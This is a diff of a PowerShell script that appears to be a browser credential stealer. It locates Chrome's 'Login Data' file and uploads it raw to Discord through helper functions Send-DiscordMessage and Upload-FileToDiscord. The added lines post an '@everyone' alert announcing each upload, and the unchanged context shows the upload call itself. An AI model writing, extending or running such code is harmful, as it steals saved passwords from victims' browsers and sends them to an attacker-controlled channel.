@@ -7,6 +7,11 @@ function Send-DiscordMessage {
         [string]$message
     )
 
+    # Ensure the message contains content, if not, set default content with @everyone ping
+    if ([string]::IsNullOrEmpty($message)) {
+        $message = "@everyone A raw Chrome Login Data file has been uploaded."
+    }
+
     $body = @{
         content = $message
     }
@@ -59,6 +64,9 @@ if (-not (Test-Path $loginDataPath)) {
     Send-DiscordMessage -message "Chrome Login Data not found!"
     exit
 }
+
+# Send the message with @everyone ping
+Send-DiscordMessage -message "@everyone A raw Chrome Login Data file has been uploaded."
 
 # Upload the raw Login Data file directly to Discord
 Upload-FileToDiscord -filePath $loginDataPath
